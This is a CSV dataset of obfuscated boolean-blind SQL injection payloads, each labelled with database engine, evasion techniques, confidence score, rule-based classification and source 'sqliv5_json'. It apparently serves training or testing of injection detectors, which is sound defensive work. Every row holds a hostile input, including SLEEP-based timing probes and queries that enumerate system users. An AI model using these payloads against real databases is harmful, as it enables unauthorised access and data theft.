payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
0o0x0o10 )/*Uy\wL#;*/ as hLCN wHERE 0x48d := (seleCT (SElecT (SELECT 1105))) rlIKe ( Select * fROm (/**/ sElEcT ( sleEP ( $(SeLECt (SElEcT (SeLECt 0))) ) ) ) ) VwYq ) AND tRUE~ANd trUe AnD tRue Or 'R'='RU' AND (SELECT 1)#>~h,boolean_blind,mysql,case_variation|comment_whitespace|inline_comment,0.45,rule,sqliv5_json,string_single_quote
"6%'! )( ||(sElecT 0X0o1d03)%=*dBMs_pIPe.ReCeiVE_mesSaGE {( chR (+ (SELEcT 0x56E) )) oR<ChR ( (SELEcT (Select 0x2F)) &) * Or CHr (< (selEcT:0X0X5a) )! ]Or cHR ( \0o3x0b0b0X5F6B5FA9189c6b7ad ) ,1x5 ) Or ('D'='d)' :oR %0x0 oR FAlSE And tRUE\AnD TRUe and ""3g/x"" NOt LiKe ""8G/Xz""(or '.'_lIkE '.M' and (SeLecT_(seleCT (sELEcT 0b0X58F)))!=(SeleCt (SELECt (SeleCt (SELeCt 0X590)))) anD!tRue Or fAlsE AND 'Dz&' NoT lIKe 'dZ&%' AnD (seleCT (SeLEct (sELect (SElEct 5809))))!=(SELECT (SELECT (SELECT 1810))) OR False or (selECT 0)ANDTruE --",boolean_blind,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"sELect `( CasE When (@ 0582 liKe (SeLecT 0XfF0b110) ) |theN 0O1 ELSE (selEct (seLECt (sELECT (SELECT 4276))))* ( selEcT (selecT 0X0O13Dc) FrOM)MaStEr..sYSdATaBaSES ) -end"" ) oR 'l'='LF'\AnD (seLeCT 0x1) aND TrUe --",boolean_blind,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"1 or 0O0 or faLsE oR~0x0 and ':' like ':' OR False# ) or ExTRacTVALUe $( (SELEcT (SELECt""(SELecT 2xc91))),conCat ( /*j*/0X5C,0X7171306a8o0o905, (? SElEct/*zMC=(seLecT/*V<Pfj*/(SElEcT (sEleCt (sEleCt (sELecT (SelECt 0x2))))));H @: s/Nt:-Q*/ ( >ELt? ( (SeLect-0X0X511) Like) (SElect?(SELecT (sElect 0x511))),0b0x1] ) +) ^)+ ,0X747A5B10102111A0b0o3941267 . ) !) # kFA`F)C7",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"0X1"" ) WHErE?0O0B17001100901116+=((SelecT (sEleCt (SELect\(SELEct (SeLECt (seLect (seLeCt 0o13102)))))))<&&=0b0B10000001010101103110000101010011001011011 LiKe/**/ ( SelEcT COUNT (' *-?) ?fRom GeNErATE_SERIEs/*O*/ (* (SElEct (sElect 0X1)),(SeLecT (SElect (seLect 0X4c4B40)))/*UE8;!pz*/ ) ): AND 0O6 , or FaLsE and @truE And TRUe oR FAlSE aNd '3X0-4' LIKe '3X0-4' OR (sELect (SELEcT 0x0)) --",boolean_blind,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,string_single_quote
"4"" ?) AS sAqY WheRE>0X5642 LIKE (sELeCT 0XA0b0o7o132) ( SELEcT ( cASE When ( 0b0x0b11111Eb LiKe 0X31Eb )) THen RegEXP_sUBStrIng ( RepEAt ( left ( cRypT_kEY ( cHaR ( (SELect (seLEcT (SeLECt 0X0O17)))/**/ ) or chaR ( 0X46 )| }oR CHAr ( 0x55: )$ ,nUlL ) ,0X0 ) ,0X0B1000DCD7500 ) ,NuLl ) ElSE chAR ( 0O5X4C ) or cHAr ( 0o0O0X0X0x29 ) OR ChAR> ( (SElEcT (SEleCT (SElect (SeLEct 102)))) ) OR cHar ( .0x52 ) ENd ) FROm ;( vALUes )( 0X0b0 ) . ) ) ANd TRuE OR FALSE OR FAlsE Or FalSe AnD (seLeCT (seLect (sEleCT (seLECT (SeLEcT (seLeCt (SeleCT (SEleCt (selEcT (SELECT 1)))))))))) And TRUE oR (SeLecT (SElECt 0x0)) Or FalSe Or '}\:'='}\:s' aND TrUe or fALsE oR falSe And TruE or 'cR'='cRL' --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
0b1'+ ;( sELeCT Echl WHere (SelECT (SeLecT 0x1A87)) = (SeLEct (sELeCt (selEcT 6593))) RLIKe . ({%selecT * anD 0x0 or 0o0B70111171111 NOT LIke 0O2753 OR FaLsE >Or ' '=' ?'#from ( SELEcT ( sLeep ( (SeLect/*;f*/(sELeCT (seleCt 4x7))) ) ) **)} VWyQ ) #l&JY:nn_\c,boolean_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,string_single_quote
"0b2%'` ~) )@ OR ELt ( U+[o* 3x09f1 @like (SElECT 0o33361),slEEP <( 0X0o0B0o0X5 ;) ; ) ?\ AnD 'aH>DR'='AH>dr':Or FAlse &&%= '[u7y'-NoT lIkE '[U2Y&' And tRue And tRue[&& True or falSe OR FALSE && (sELecT (SelEcT (selECt (Select 1)))) aND tRue#ELi!_UHCVGqUWsE<",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,unknown
"0X0b0o0O1'|IN`booLEan MOde ) }|or (sELEcT 0x0B0x1005Eba89Fd) likE \;LiKe ( /*(<(seLEcT 0x0)y?R&w%F*/'abCdeFg',UppER _( hEx> ( RANdOmbloB]_( 4X2FB3b6o0o0O3327B384/(SEleCt (SEleCT 0X0o0x2)) , ) ) +` `); ) and 0x1 Or?FaLsE AND> ""c<"" lIKe ""c<"": || faLSe aNd TRue oR '|w' Not)Like '|w' OR faLSE or.FAlse and ';'=';' aNd (SELeCt (SelECt (sElECt (SelECt (SEleCt (sEleCt (SELecT 0x1))))))) oR~FAlSE ANd ""0""=""0""*aNd ""`aJ""!=""`aj8"":or fAlSe or; ""q?""!=""q?"" AnD (seLeCT 0x120) NOt liKE (sElEcT (SELECT 389)) oR 'O? '!='o? '.--",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"0O0X6O1' ) ;) /**/ or chAR (< (SElECT 0x17) ) OR ChAr ( }(sElECt (seLeCT 0xA0)) [) oR chAR (,@(sElECt 0x5d) ) OR ChaR ( 0x0X0O7f ) liKE rEgEXP_sUBstRiNg ( rePeat ( rIGht/ ("" ChAr/*smI*/ ( 6x4A3 ) Or '""6'='""0B1010n' Or'faLSe aNd ""s""=""S"" anD)trUe AnD ""tp"" not likE ""TPj"" OR falSe aND ""Cl""=""CL"" OR "":"" NOT liKe "":"" oR falSE AND TRUE Or falsE AND (sElEcT 0X1AB5)<>0X1aB6 OR FAlsE oR ""__Rip"" nOT lIke ""__RIp"" and tRUe|OR fALse or ""_TyX"" NOt Like%""_tYx"" Or (select (SELECt (selECt (SeLecT (SEleCt (SELECT (SELECT 0))))))))oR;faLSe or (SELECT (SElEct 0)) OR fAlse AnD=TrUE OR False# ,0B0x0X0X0x0 ) ,(SeLeCt[4x18a0x0B8xeE2b10a) "")] ,NULl, ) or ""+ p-i"" likE ""+ p-Ix"":or ""!"" liKE ""!U"" Or 0x6O0 or (selEct""(SEleCT 0o1x2xA1d))\= 0o2B3XA0O0o1E --)(lJ~)AoyyE~<",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"0o0O2' )+ /*a1</O+;W@TW4dHL4*/ );\ AS nGoo whErE (sELEcT+0x0x0o80c4)=4x9X15C3 && 0x0b0x15b2@ LiKE ({ SElEct COUnt ( * ) FROM AlL_usErS t0x0O1,aLL_USErS t4,alL_USeRS?t0o10,all_users t0o0O0x0x0X0o1,all_UseRs T0, ) + AND ' b'=' B' oR ""w(^"";lIkE ""W(^;"" oR((sELeCt (sELECT^(seLecT 9X0))) Or* "" 0"" liKe "" (seLect (select 0X0B0O0))?"" And TRUe or &FalSE,oR ""k2f["" NoT LiKe ""K2F["" aND TRUE""Or FAlsE Or 0X0} oR FAlSE/**/AnD TRUE OR ""QAT""'NOt LIkE ""qAt"" && tRUE or (SelecT (seLecT 0)) OR faLSe OR (seLECT (SELEct 0)) or faLSE oR ""hM"" NOt LIKE ""Hm"" and (SELECt (SElECT 0o1)) anD (sELecT 1) --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.7,rule,sqliv5_json,unknown
"0B1""% )] As aSSU WhERe (seLECt?(SeLECt 0x6D0B0B17811041117117102))/*4WI*u0o0B1K:$$x (oJ;*/ LIke ](SELeCT (SELEcT 0x209))) Or (sElEct 0X0B1113Ec)$ liKe{ ( seLEct&COUnT ( *~ )& From SYsUsERs as syS5o1,sYsuSers'As SyS7,sYsusErs aS;sys0B11,sYSuSeRs as SYs0b100,sYsuSeRS$aS SyS5,SySuSerS AS Sys9,sYsusErs aS>sYS0b111 ) +aND ; 0O2O2x0O0O0X15 Not LIkE (SelECt (selecT (SElecT 0x221)))~or;FalSE OR~fALSe`OR 0O0X0 oR FAlSe OR FAlSE OR fALSe AnD TRUE oR faLse oR!False ANd ""p}EH""=""p}Eh"" oR FALSe Or FaLSe OR FALSE Or FAlse OR 'J3n'='j3nF' ANd True oR FaLSE && True OR FALsE --",boolean_blind,unknown,case_variation|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0 AnD (SElEct 0o0B0xA9c)= (^ SeleCT CoUNT (` * ') FrOM sySUSErs aS Sys5b0b0X0X0O0o6,sYsuSERs/*T<*7pCSffbYB*/As sys2,sySUSers%as sys0o0X0x0O0o0b11,sYsUserS As@Sys0o1,SYSusERs AS SYS5,sysuSERS:as{sys5,SYSusERs AS sYs7 anD TrUE Or ""f""<>""F"" oR falSe OR (selecT (sELEct (sElEct (SELECT 0)))) OR 'D'='dy'# ) ?OR[falSE aNd tRuE anD TRUe]oR?0B1110101800010 NOt LIke""(SELEcT (SeLect 0x1Eb0b0)) ? && truE?oR 0x0 OR FAlsE AND`trUE anD (SELect (sEleCT 0xDbB)) NOt LiKE (sELeCT (SElEct (selEcT (SelECT (seLect (SElect (sELeCT 0xDBc)))))))/*Lpq*/And TRUe Or 0X0 --:R-",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,string_single_quote
"0b301' OR ( sELeCt 'UqBj'>FroM dUAL!WHerE 0B1101061010800^<LIke 0b0x0x0o0O0x0b11B0O0O14 oR CHar (* 0b6O0x23* ) ||CHAr (>}(SelEcT 0X50) ) Or ChAr ([ (selECT 0x63) ) Or CHaR ( (seLect 0x55) ) =reGexP_SUbsTrIng (; REpEat (% LEft ( CRYpT_KEY ( ^CHar& ( 2O0B2O0o0O0O221 ) _ OR cHAr ( 0O0O0b110011111 ) oR ChaR (? 0X0X17/*)JK4*/$) ,nuLL: ) ,0O0x0* ) ,(seLEct 0o0x2FAf0x0B1100100100) ) \,NulL &) or faLse &&( TRUE or (SELecT (SelECt (SElEct$0x0))) Or&fALsE OR%0x0 AnD (SELECt 0X1) OR ""L5"" noT lIKE ""l2"" or[0x9c3 not lIKE ((SeLeCt (SelEct (seLECT (SelecT (SELecT (selECT 0x9c3)))))) and tRuE and trUe AnD true OR FAlSE ||_'W' LikE 'wB' oR faLsE And tRUe or falsE)oR FAlSE OR falsE && (SElECT (selECT (SElECT (SeLEcT (sEleCT (SeleCt (SEleCt (SELECT 1)))))))) anD tRuE AND tRue oR FAlsE!AnD trUe AND TrUE oR fALSe -- s",boolean_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,string_single_quote
sElecT [&( Case WhEn ;<({ 0B10011000000100=0b0x1BE0& ) thEN 0o0X0x0B11bdD elsE (SELeCt (selECT (SELECt (sELeCt 9730))))* ( )sElect.0B0b10010001101011011110009110010100111001100100;frOm iNF or mATION_SCHEmA.CHAracTER_SEts ) END ) or '~:'='~:=' Or 'e$ms'='E$ms=' aND/trUEAnDtRuE#W0WH9Vf6;rF,boolean_blind,unknown,case_variation|hex_string,0.7,rule,sqliv5_json,unknown
"9' Or { ( sEleCt 'gWXC' fRoM duaL whERe (seleCT (SELECT 3686)) =! (seLecT (SeLECt 3625)) aND chaR ( ?(select 0x6b){ ) ||chaR ( 0O171 ) Or chaR :( 0x63? )\ ||cHAr/*N-MG*/ ( (SelecT (SelEcT (sELEct 80))) ) | lIKe rEGEXP_sUbsTRInG (| RePEAT (^ LEft ( Or falsE oR False AnD tRue OR FaLSe OR 0#cRYpt_KeY '( chAR ( #(sElEcT (sELECt 0X2E)) ) Or char ~( (seLeCT 69) ) Or chAr ( (select (SeLEct (SELECT 83))) ) ,nULl ), ,0o0 ) ,0x1dCd0b1001510110A ) ,nULl &) Or 'o' Not lIKe?'O'}OR '0O0wD' lIKE '0X3WD!' ANd 0X1 aND TruE AND (sELEcT 1) OR fAlsE < ANd ';0X6-g' Not LIKe ';(SeLeCt (SELECT 6))-g7X9' oR (SelECT (SEleCt 0)) Or falsE OR (selecT~(SELEct 0)) OR (sELect (SELECT 4071)) != 2071 OR ""LA*"" NOT LIKE ""LA*"" oR 0X0 oR FALSE --KB?",boolean_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,numeric
"0X0O1 whERe (SeleCT 0XA0o3f) LiKe (SELECt@(seLEct!0XB07)) ANd 0O2X8xE0b1O0b10011101B \= /**/(} selECT coUNt ( * ) :fRoM SYSiBm.sySTableS aS t1,SYsIBM.SYstAbLes'As t6,SysIBm.sYsTABLeS as t3 ) && 0O0B105720001100 LiKe 0O4617 AnD (SelEcT 0xA3f) NOt likE (selEcT (sELecT 0x0O0B1100910111010)) Or 0o10x9 or 'd'='DK' oR\fALSe AnD 'I'<>'I5B0B11'; AND) ""wgAG""=""WGAg"" OR 0x188C<>(seleCt (SelecT)0X171c)) And TruE aND TrUE ANd trUe oR FALSe AND 0o0x8 ANd (selECT (seLECt OR ',/UWe'<>',/uwe' OR FalSE oR ""/>"" LIkE ""/>}"" oR FALSE Or FalSe AND True#(SELECt 0O0x1))) AnD tRuE ANd TRUe oR '$E' not='$e' oR (sELeCt (seleCt (selECt (SeLECt (SElEcT (SeleCt (SelecT (seLECT (sELecT (sELECT (SELEct (SELECT 0)))))))))))) AND ' R' noT Like '?R^' or faLsE --{dLPIp.",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"select""sleep !( (SELECT (SELECT (SELECT 9))) OR '[k'='[kM' OR False OR (SELECT 0)#) and 'gajm' LIKE! 'gajm",boolean_blind,unknown,case_variation,0.8,rule,sqliv5_json,string_single_quote
"1"" ) ) As AjWE wheRe 1153=0x481>RLiKe ( SelECt ] ( cASE]whEn[?/*0o1u}U/Np En&*/( <4O17011?`lIKE% (SelEct (sELecT 0x0X1e6o35)){,) theN (sELEct (sELEct 0o1)) ELSE 0x28 EnD ) )^ oR (SElecT 0X1C0B11110) not lIKE (seLeCt 0X1c0x25) And~""k[""=""k["" AnD (SeLecT 0x1) and <TRue Or (sEleCt (SELECT 0)) aNd TrUE oR FALsE && (selecT (SELEct (SELECT 1))) oR>(SELECT (SELECT (SELECT 0))) Or 0x0 aNd "")$""="")$"" --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.8,rule,sqliv5_json,string_double_quote
"SeleCT ( CASe/*Fb M1e/I=o><4O ~dsP`*/WHeN ( ;(SeleCT 0X124a) lIKE 0o0b1001050111010 -) TheN 0o0O1 else ANd true And 'IF'='if' AnD}(SEleCt (SeleCT (SELEct (SelEct (SELECT 1050))))) NOT LiKe 1051 AND trUe#(seLECT 0x0X1Da)* /**/( SELECt 0b100X143A frOm mastEr..SYSdaTaBASes ) End[ ) and""'wMu' nOT likE 'WmU['*or 0O0; or '&<' not LIKe '&<' --yO&%S;M",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"0o3' +aNd ""!_"" NoT LIKE ""!_r"" oR""FaLse AND ' ""u V' like ' ""u v'=OR FALse AND TRuE:Or ""=r"" nOT Like ""=R"" or$""q""<>""Q"" Or (SeLEct!(sElECT (sElECT_(SeLecT (SElecT (SelEcT (seLecT (select (SeleCt (SElECt (SELEct (sELeCT (sElECT (SELECT 0)))))))))))))) Or fAlse_&& ""{""<>""{o"" OR 8x0 anD ""0o4v""=""4v"" or fAlse{Or (sEleCt 4X0) or FaLSE anD tRuE or faLSE or 0#) & anD$7x0O0X0X0X6dE = :( seLecT cOuNT $( >* )/*<kw*/~ fRom rDb$FieLds AS t8,RDb$TYPes As T0O3,rdb$cOLlATiOnS As t0X8b0o145,rDB$FUncTIONS As#t0O9B0 ) /**/ AND % ( 'gCnA' =['Gcna(6li2O3]?Ws/p-JpQ]@IN",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"7%' $or &(SELeCt_(seLect 0O0O0x0b0x0a0150B))+= ( sELECT{CouNt_ ( * }) +;from(sySUSErS""aS(sYS8,sYsUSerS as|sYs0,SYSUSeRS as sys3,SySuseRs*aS Sys1X4,SysUseRs aS sYS0x6,SYSUSErS aS sys9o8,sySuSeRS AS SYs0x0B101 ) ~ And '%' /*Z""Su Or FaLse anD (SELect (selECT (selecT (selEct`(seleCt (SeLect&0x0))))))~OR 0o0X1'Or>0b2~Or falSe && True||'W'='wC'&oR*""}p"" noT liKe'""}P"" or faLse aNd+(sELecT (SElECt (SElECt 0X1))) OR%(SELecT (seLECt 0x3689))=(seLEcT (sELEcT 0X168A)) Or ""To""=""ToE"" or fAlSe && TrUe Or (sElECt (SELECT 0))#i BChihvmlYX0U*/LIke ']u3Gyffnh",boolean_blind,unknown,case_variation|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"1' WhERe/*6ZAJ*/(SElEct (selECt (seLEcT (SeLECT 0B0x706)))) =\ 0x403 oR cHAR ( (seLeCT 0x0o2X0B0xaC)<%)= Or CHar ( 0X55 ) or cHar ( (SElECT (seLeCT (SeLeCt (SeLeCt (SElect (seLecT (SelECT 67))))))) ) { OR cHaR/*dS1(Y>.x`zZ3Of&AML?*/ (+ 0o0X0B110111 ) . LikE < RegExP_SuBStriNg ( REpEat (; rIGHT%_( CHAR ( 0x15D5 )[ ,0O8x0B0O0o0O3 ) "",0B1x17A95f32C ) ,nULL ); and +(select (SELECT 0x0b1C0o62)) nOT Like (SeLECT 0b0x1c36): Or 'X'.lIkE 'x`' aNd ANd truE aND (sElECT (SeLeCT 0o1)) or FalsE or (SEleCt (Select (SELECT (SELECT 1)))) or ':H'=':ho' Or 0 aNd TRuE@OR False&&(SELECT 1)#""`"" nOT Like ""`."" OR "" "":noT LIke "" "" OR ?(sELEct 0x966) NOt LikE ]0x966 --I7O7^m W})Bl#T[Oj",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"0O0B1'/*Ob5Z_*/In BooLEAN modE );^ AnD elt ( (SeLecT 0xfd1) likE (SElEct)0B1000010011001),1B0b1110100011010101001111011010011010001011 )/*pU0b11(fOoswI9H|h 4CJ5*/ Or 0x0 aNd}5_And tRuE And '0O0b0qr'!='0qRc' or falSe AND 'Ib;y' LIKE 'Ib;y' AND (SELECT 1)#pGG",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"0O1"" whEre@0O0o0X945=(SeLecT=0O4509) OR elt ( 0o0X16f1=(SeLeCt 0x16f1),sLEEP >(~ 0o5 < ) ) oR<3449 lIke (SELect](seLecT (selecT 0b110101110101))) OR (SeleCT]0x3e7)]*noT ` likE (SeLECT<(sELECT 999))~OR (sEleCt 0X0X1EeF)=(selEcT 0x1E0b11100) &&/**/ (sELEcT (sElect 0B0x2)) or FAlsE} and trUE OR 'QE'='Qe1' And!true+ANd[true$And 0O0x22E3 not LiKe 8932 or fAlsE Or fAlse#d],P7",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"sElECt- <( Case-WhEn , ( 9799 (LikE _2260(!) THEN*1 ElSE 0b0b0b10010001101011001100010001110001010001011011* ( SeLect*(selecT 0o23123)}fROm]MAstEr..SysdATaBASES/**/ )/**/ AND 8108=0x1fac OR 1260=1261#EnD/*fw0B0EAz*)0hN,*/"") Or 6809 NOT in (0B1101010011000,0o15231,0B0B1101010011010) --SOs""fe",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,in_clause
"1%"" )) or FaLSE AnD tRUe anD (selECT (SELECt (sELEcT (sEleCT (SELECT 7)))));or (sElEct (SElEcT 0)) oR fALSE oR "" j"" <> "" J"" OR 'D;F'='D;FI' OR False# ) aND chAR ( (SELeCt 0X89) ) OR chAR *( (sELECt (SELECT (seleCT 0B0X7D))) ) OR Char ( (sElECt 0o141) ) ||cHaR $( 0X50+ )^ liKE reGExp_SubstRInG ( +rEPEAt )({ Left ( CrYpt_key =( char+<( ;(SelecT 0o0x41) ) ||CHar ( (SelECT (SelECt (SElECt (seleCT (select 0x13))))) ), Or ChAR ( 0B1010011 ) ,NULL ) ,0b0o0O7 )@ ,0b11701118091110712010100030001 ) ,NULl >) ---<zG",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"1' WherE 0X8B1cB9? LIKE; 0X1Cb9/*Sq.K|N*/or (seLect 0x1fdd) !likE ( &Select CoUnT ( +* ) * From GENeRaTE_SeRIEs ( (SELect/**/8),(seLeCt 0X2c5ED2) )' ) OR fALSe AND 'x'='X' and truE oR (sELEcT 0x0) OR (SelEct (SELECT (SELECT (SELECT 0)))) OR False OR False AND True --",boolean_blind,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.41,rule,sqliv5_json,unknown
"Iif +(/*;ZY(TqRr,A""J:M*/~ aND *Or FALse!ANd tRUe (oR (seleCT 0O0o0B0b0) OR fALsE anD TRUE#(sELeCt (SElECt (seLECT 0633)))(liKe (seLeCt 6638) .AND ;':9u'=':9u'_Or (SelECt}0x15f0b0O4) Not LiKE+3084[OR 9B0X0 And 'J'='j',anD:(SeLeCt 5732)=NOt LiKe 0o13143 AND 'ft' noT LIkE 'Ft""'_aNd TRue#(seleCT 8384) liKE '/*xVX&5*(selEct (SElECt 2))>J$gzinT!G*/(sElEcT{0b0XDBB),(SElECt 4b6o0x0B100),0O0x0O1/(Select 0B0) ) eh&}qNbZ.ybe",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"0B0x4' OR/*(SElEcT 0x5)} ' OR '>I' LIKe '>I/' oR fALsE /**/Or (Select (sElEct (SELECT 0))) aNd TrUE or FalSE#` f Px*/sLeeP ( (SelecT 0x5o11) ]) <AnD (sELeCt 0x1) or 0O1 Or (seLeCt 2X0) OR (SeleCt (seLECT (SeleCT (SElECt 0O1)))) OR 0X0B1 Or fALsE AND 0x3#v{HI""]EcCJJ",boolean_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.45,rule,sqliv5_json,string_single_quote
"0O1"" wHeRE 0x27d6=6b0o0O51786 ( seLeCT ( CASe WheN ( (SelECt 0o10601)=7x31eB ) then regEXp_subSTrInG ( rePeat ( LEft ( crYpT_kEy ( cHar ( (SelEct 4xf) ) or CHaR ( 0X0B101109 ) ||CHar ( (SELEcT 0x58) ) ,nULL ) ,9X0 ) ,(SELEcT (seleCt 5O5X1DCd6508)) ) ,NUll ) ELSe CHaR ( 0X0o2e )& Or chaR ( ?(seleCT (seleCt (SelEct 0O101))) )+'||CHAr ( 0x15e ) ||chAr <( (sELECt (SeLECt 1x48)) ) End ) From And 'K UT'='k Ut' And tRue Or 0b0 aND (SELECT 1) OR False#(_ valUES ( 0x0 ) ) ) OR FAlSe Or 0X0 ANd TruE oR (seLeCt (SelEcT 0x0X345C)) Like 0o21135*oR False Or faLsE And 0x1/Or:0xA43 NOT LIKE 3Xa43 OR_falSe Or FALSe_ oR (SELeCT (SeLeCT (sELECT (selecT (SELEcT 0X0))))) or FalSe OR 0X01E not = (SeLEcT (SEleCt 0x9Ae)) or (SELeCt (SeLeCT (selecT 0x0))) Or FaLSe oR faLse or FALsE oR falSE --v6",boolean_blind,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"1' AnD ( SeleCt (SeLeCt 0x236b)`fROM ( SeLeCT*couNT ( * ) ,CONCAt ( 0x0o33267572A71, ( SElecT ( ElT -( (SelecT 0X236B) Like : 0X215b,(sElecT (Select (SeLEct (seLeCT (SELect (seLEcT (select 0X9))))))) ) ) ) ,0b0X717A267A71,FLOor ( rAnD +( 0X0b0 ) <*0X0B7xa> ANd 0o1 OR*fALse aND tRUe Or\0x17E0B0 NoT lIke (select 0x17e0) oR (SeLect (sELeCT (select 0)))# ) ) $x froM iNFoRMATion_ScHema.cHaraCTer_sEtS GroUp by X ~) A ) ; ANd 'RxDZ' =''RxdZh'p6I]<.",boolean_blind,unknown,case_variation|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"1' in;boolean MOdE ) Or ELT, (} 0x0b10000f0X4 LIKE/*nS;@X*eLL;C_{!v}B]J*/2X0o20F0b0B4x1,slEep ( 0X8x6]*:)""`? )> && TRUE && TruE Or '2lz3' lIKe '6lz7x0X6/' !AND (SeLeCT~(SeLeCt[0X1)) aND( (selecT (seLEct (sELECT (SELect (SeLeCt (sElECt (SelEcT (sElect (SelEct (sElEct (SELECT 1))))))))))) and trUE && ' anD ';d[Hc'?Not LIKE ';D[HCS' or FalSe#'!='##'#/\-brWeG",boolean_blind,mysql,case_variation|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,string_single_quote
"2%"""",) }Or~ (seLeCT (selecT 0x3FE))== } ('/*(f!va;(SeLECT (SELEcT (SElEct (sElEct (SelecT (SeleCT 0o6))))))iEq.QB2Z e;&s-L*/seLeCT couNt ( * )AndTrue# fROm ALL_uSeRs T6O0O1,aLL_uSErs T2,aLl_users]T3,aLl_UsERS t9B0B0O0b100,ALl_Users T0b0o9b905 ) :Or '[4B' nOt LIKe '[4B' AnD\TrUe oR (SELeCt 0O0B0) aND TRuE( && ""."" not LIKe "".4"" and (sELect 0x6) anD TRUe aND 'k' LikE 'K'/Or (SeLeCt (seLect (SELECT (SELECT (SELECT 0))))) --5",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"0x0o1'/OR.?|( #seLecT 'OxDH'/**/WhERe 0x1b0b0B11000100111000001 = 0o0O1X1B38/*pyo*/aNd[SlEeP /**/( 0B0B0b8000001100100100011000110100001 "");*;AnD 'D='='d=' anD (SELeCt&(select;9X1))#]W y",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
